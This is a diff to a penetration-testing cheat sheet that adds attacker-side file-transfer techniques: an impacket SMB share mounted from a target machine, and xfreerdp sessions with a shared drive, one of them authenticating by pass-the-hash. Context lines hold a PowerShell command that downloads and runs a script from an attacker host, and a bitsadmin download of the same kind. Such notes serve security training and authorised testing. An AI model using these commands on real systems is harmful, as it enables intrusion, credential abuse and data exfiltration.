@@ -93,6 +93,25 @@ IEX (New-Object Net.WebClient).DownloadString("http://attacker_ip/PowerView.ps1"
 bitsadmin.exe /transfer /Download /priority Foreground http://attacker_IP:80/name_of_file.exe
 ```
 
+## smbserver
+```
+# Attacker machine
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+# Target machine
+net use n: \\192.168.220.133\share /user:test test
+
+Check your kali machine on /tmp/smbshare and you can now transfer files to and from the target. On target machine, if you have RDP, you can easily check the network share on file explorer and transfer over files
+```
+
+## RDP Mount
+First one is with user and pass, second line is for user and NT hash. Once you successfully connect, you should see on the file explorer the network share and you can transfer files to and from your kali machine to target. Files will appear in your /tmp folder.
+```
+xfreerdp /v:target_IP /u:user /p:password9 /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
+xfreerdp /v:target_IP /u:user /pth:NT_HASH /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
+```
+
+
 # Local Enumeration for Privesc
 ## Linux
 ### Linpeas
